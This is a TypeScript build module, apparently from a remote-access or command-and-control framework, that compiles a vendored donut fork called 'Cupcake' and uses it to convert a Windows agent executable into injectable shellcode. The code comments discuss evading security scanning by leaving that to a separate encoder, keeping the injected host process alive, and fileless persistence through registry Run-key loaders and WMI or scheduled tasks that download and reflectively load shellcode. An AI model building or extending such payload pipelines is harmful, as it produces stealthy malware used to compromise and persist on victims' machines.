import fs from "fs";
import path from "path";
import { $ } from "bun";
import { ensureDataDir } from "../paths";
import { logger } from "../logger";
import { resolveRuntimeRoot } from "./runtime-paths";

type CachedBuild = { cachedAt: number; sourceMtimeMs?: number; tag?: string };

/**
 * Cupcake (a maintained fork of TheWover/donut with fixes and improvements) is
 * vendored in the repository under `cupcake/`. Unlike upstream donut, Cupcake
 * ships no prebuilt releases, so the binary is obtained from source:
 *
 *   1. a system-installed binary (e.g. pre-compiled in the Docker image),
 *   2. a previously compiled binary in the data/tools directory,
 *   3. compiling the vendored source with gcc (Linux) / mingw-gcc (Windows).
 */

function toolsDir(): string {
  return path.join(ensureDataDir(), "tools");
}

function binaryPath(): string {
  return path.join(toolsDir(), process.platform === "win32" ? "cupcake.exe" : "cupcake");
}

function versionFilePath(): string {
  return path.join(toolsDir(), "cupcake.version");
}

function readCache(): CachedBuild | null {
  try { return JSON.parse(fs.readFileSync(versionFilePath(), "utf8")) as CachedBuild; } catch { return null; }
}

function writeCache(entry: CachedBuild): void {
  try {
    fs.mkdirSync(toolsDir(), { recursive: true });
    fs.writeFileSync(versionFilePath(), JSON.stringify(entry));
  } catch {}
}

function findSystemCupcake(): string | null {
  const systemCandidates = ["/usr/local/bin/cupcake", "/usr/bin/cupcake"];
  for (const c of systemCandidates) {
    if (fs.existsSync(c)) return c;
  }
  try {
    const exe = process.platform === "win32" ? "cupcake.exe" : "cupcake";
    const p = Bun.which(exe);
    if (p) return p;
  } catch {}
  return null;
}

/** Newest mtime (ms) of the files that are compiled into the binary, or null when the vendored source is unreadable. */
function sourceFingerprint(dir: string): number | null {
  const inputs = [
    "donut.c",
    "hash.c",
    "encrypt.c",
    "format.c",
    "loader/clib.c",
    "include/donut.h",
    "loader_exe_x64.h",
    "loader_exe_x86.h",
  ];
  let newest = 0;
  try {
    for (const rel of inputs) {
      newest = Math.max(newest, Math.trunc(fs.statSync(path.join(dir, rel)).mtimeMs));
    }
  } catch {
    return null;
  }
  return newest > 0 ? newest : null;
}

export function resolveCupcakeSourceDir(): string | null {
  const explicit = process.env.CUPCAKE_SOURCE_DIR?.trim();
  const candidates = [
    explicit ? path.resolve(explicit) : null,
    path.resolve(resolveRuntimeRoot(), "cupcake"),
    path.resolve(process.cwd(), "cupcake"),
    path.resolve(import.meta.dir, "../../../cupcake"),
  ];
  for (const candidate of candidates) {
    if (candidate && fs.existsSync(path.join(candidate, "donut.c"))) return candidate;
  }
  return null;
}

function findCompiler(): string | null {
  if (process.platform === "win32") {
    for (const c of ["x86_64-w64-mingw32-gcc", "gcc"]) {
      if (Bun.which(c)) return c;
    }
    return null;
  }
  return Bun.which("gcc") ? "gcc" : null;
}

/**
 * Compiles the vendored Cupcake source (upstream donut build recipe, renamed
 * output). Uses aPLib packing which works on every host platform.
 */
async function buildFromSource(sendToStream?: (data: any) => void): Promise<string | null> {
  const log = (text: string, level = "info") =>
    sendToStream?.({ type: "output", text: `${text}\n`, level });

  const sourceDir = resolveCupcakeSourceDir();
  if (!sourceDir) {
    log("Cupcake: vendored source not found (cupcake/)", "warn");
    return null;
  }
  const cc = findCompiler();
  if (!cc) {
    log(
      process.platform === "win32"
        ? "Cupcake: no gcc/x86_64-w64-mingw32-gcc on PATH — cannot compile from source"
        : "Cupcake: no gcc on PATH — cannot compile from source",
      "warn",
    );
    return null;
  }

  const out = binaryPath();
  fs.mkdirSync(path.dirname(out), { recursive: true });
  const aplib = process.platform === "win32" ? "lib/aplib64.lib" : "lib/aplib64.a";

  log("Cupcake: compiling vendored source…");
  try {
    const r = await $`${cc} -Wunused-function -Wall -fpack-struct=8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader/clib.c ${aplib} -o ${out}`
      .cwd(sourceDir).nothrow().quiet();
    if (r.exitCode !== 0 || !fs.existsSync(out)) {
      const stderr = r.stderr.toString().trim();
      log(`Cupcake: compile failed (exit ${r.exitCode})${stderr ? `: ${stderr}` : ""}`, "warn");
      log("Cupcake Shellcode mode requires a compiled cupcake binary — install gcc/x86_64-w64-mingw32-gcc", "warn");
      return null;
    }
    fs.chmodSync(out, 0o755);
    return out;
  } catch (err: any) {
    log(`Cupcake: compile error: ${err?.message ?? err}`, "warn");
    return null;
  }
}

/**
 * Ensures the Cupcake binary is available, in this order:
 *   1. previously compiled binary in data/tools, when it was built from the
 *      current vendored source (fingerprinted by mtime, no time-based re-checks),
 *   2. system-installed binary (PATH or /usr/local/bin, e.g. baked into the
 *      Docker image),
 *   3. a local binary with no vendored source to compare against (packaged
 *      installs that never ship cupcake/),
 *   4. freshly compiled from the vendored cupcake/ source.
 * Returns the path to the binary, or null if it could not be obtained.
 */
export async function ensureCupcake(
  sendToStream?: (data: any) => void,
): Promise<string | null> {
  const bin = binaryPath();
  const cached = readCache();
  const binExists = fs.existsSync(bin);
  const sourceDir = resolveCupcakeSourceDir();
  const sourceMtimeMs = sourceDir ? sourceFingerprint(sourceDir) : null;
  const builtFromCurrentSource =
    binExists && sourceMtimeMs !== null && cached?.sourceMtimeMs === sourceMtimeMs;

  const log = (text: string, level = "info") => {
    logger.info(`[cupcake] ${text.trim()}`);
    sendToStream?.({ type: "output", text: `${text}\n`, level });
  };

  if (builtFromCurrentSource) {
    log(`Cupcake: using compiled binary (${cached?.tag ?? "built"})`);
    return bin;
  }

  // A system binary is runnable as-is; never recompile over it just because the
  // vendored source moved on (that recompiled the same binary on every request).
  const sysBin = findSystemCupcake();
  if (sysBin) {
    log(`Cupcake: using system binary at ${sysBin}`);
    return sysBin;
  }

  if (binExists && sourceMtimeMs === null) {
    log(`Cupcake: using compiled binary (${cached?.tag ?? "built"}, vendored source not available)`);
    return bin;
  }

  const built = await buildFromSource(sendToStream);
  if (built) {
    writeCache({
      cachedAt: Date.now(),
      sourceMtimeMs: sourceMtimeMs ?? undefined,
      tag: `build @${sourceMtimeMs ?? 0}`,
    });
    log("Cupcake: ready (compiled from source)");
    return built;
  }

  if (binExists) {
    log("Cupcake: compile failed — falling back to existing binary", "warn");
    return bin;
  }

  log("Cupcake Shellcode mode requires a cupcake binary (system PATH, data/tools, or vendored cupcake/ source + gcc)", "error");
  return null;
}

/**
 * Converts a Windows PE executable to position-independent shellcode using
 * Cupcake (the maintained donut fork). CLI is donut-compatible.
 *
 * Flags used:
 *   -f 1   raw shellcode output (no base64/C/etc wrapping)
 *   -a 1|2 architecture (1=x86, 2=x64)
 *   -z N   compression. LZNT1/Xpress (-z 3/4) use Windows RtlCompressBuffer
 *          APIs and only work when Cupcake runs on a Windows host. We pick the
 *          best available for the host: -z 3 (LZNT1) on Windows, -z 2 (aPLib,
 *          cross-platform) elsewhere.
 *   -b 1   no AMSI/WLDP/ETW bypass — caller is responsible for evasion (e.g. SGN)
 *   -t     single-threaded shellcode (optional, off by default)
 *   -x N   exit mode (optional, default cupcake internal: 1=exit thread)
 *          1 = exit thread, 2 = exit process, 3 = don't exit
 *   -e N   entropy level (optional, default cupcake internal: 3=encrypt+randomize)
 *          1 = none, 2 = random names only, 3 = random names + symmetric encryption
 *   -k N   preserve PE headers (optional, default cupcake internal: 1=overwrite)
 *          1 = overwrite (zero or decoy), 2 = keep all headers intact
 *   -y N   resume host execution at offset (optional)
 *          creates a new thread for the loader, then continues host execution
 *          at the given file offset relative to the host's executable base.
 *          Cupcake parses this value as hexadecimal (strtoull base 16), so the
 *          decimal offset from the build form is converted to hex here.
 *
 * Exit behavior defaults to "exit thread" (-x 1) when -x is omitted, which is
 * what we want — prevents crashing the host process when the agent terminates.
 *
 * NOTE — persistence in shellcode mode:
 *   When the agent runs as shellcode injected into another process, os.Executable()
 *   on Windows resolves to the HOST process binary via GetModuleFileNameW(NULL).
 *   Persistence methods (startup, registry, taskscheduler, wmi) would therefore
 *   register the HOST executable for autostart — not the agent — which is wrong.
 *
 *   Theoretical fixes:
 *   1. Server-side stage-2 push: after first connection the server sends agent_update
 *      with a PE binary (persistence-enabled). Agent writes it to disk + registers.
 *   2. Registry shellcode blob: store raw shellcode in a Run key with a PowerShell
 *      loader stub that allocates RWX memory, copies the blob, and CreateThread's it.
 *      Requires a new persist_shellcode_registry build tag in the agent.
 *   3. WMI/task scheduler with a PS one-liner that downloads and reflectively loads
 *      the shellcode each time the trigger fires (fully fileless persistence).
 *   4. Self-droping: on first run, agent uses VirtualQuery on a known code pointer to
 *      locate its own loaded image, writes it to a temp path, and registers from there.
 */
export async function runCupcake(
  inputPe: string,
  outputBin: string,
  arch: "amd64" | "386",
  sendToStream: (data: any) => void,
  opts?: { singleThreaded?: boolean; exitMode?: number; entropy?: number; preserveHeaders?: boolean; resumeOffset?: number },
): Promise<boolean> {
  const bin = await ensureCupcake(sendToStream);
  if (!bin) {
    sendToStream({ type: "output", text: "ERROR: Cupcake binary not available\n", level: "error" });
    return false;
  }

  const archFlag = arch === "386" ? "1" : "2";
  const compressFlag = process.platform === "win32" ? "3" : "2";
  const extraFlags: string[] = [];
  if (opts?.singleThreaded) extraFlags.push("-t");
  if (opts?.exitMode !== undefined) extraFlags.push("-x", String(opts.exitMode));
  if (opts?.entropy !== undefined) extraFlags.push("-e", String(opts.entropy));
  if (opts?.preserveHeaders) extraFlags.push("-k", "2");
  if (opts?.resumeOffset !== undefined) {
    extraFlags.push("-y", `0x${Math.trunc(opts.resumeOffset).toString(16)}`);
  }

  try {
    // -i flag required since cupcake v1 (previously positional arg)
    const result = await $`${bin} -a ${archFlag} -z ${compressFlag} -f 1 -b 1 ${extraFlags} -o ${outputBin} -i ${inputPe}`
      .nothrow()
      .quiet();
    const stdout = result.stdout.toString().trim();
    if (stdout) {
      sendToStream({ type: "output", text: stdout + "\n", level: "info" });
    }
    if (result.exitCode !== 0) {
      const stderr = result.stderr.toString().trim();
      sendToStream({ type: "output", text: `Cupcake failed (exit ${result.exitCode})${stderr ? `: ${stderr}` : ""}\n`, level: "error" });
      return false;
    }
    const outSize = fs.existsSync(outputBin) ? fs.statSync(outputBin).size : 0;
    if (outSize === 0) {
      sendToStream({ type: "output", text: "Cupcake produced no output — check that the input PE is valid\n", level: "error" });
      return false;
    }
    return true;
  } catch (err: any) {
    sendToStream({ type: "output", text: `Cupcake error: ${err?.message ?? err}\n`, level: "error" });
    return false;
  }
}
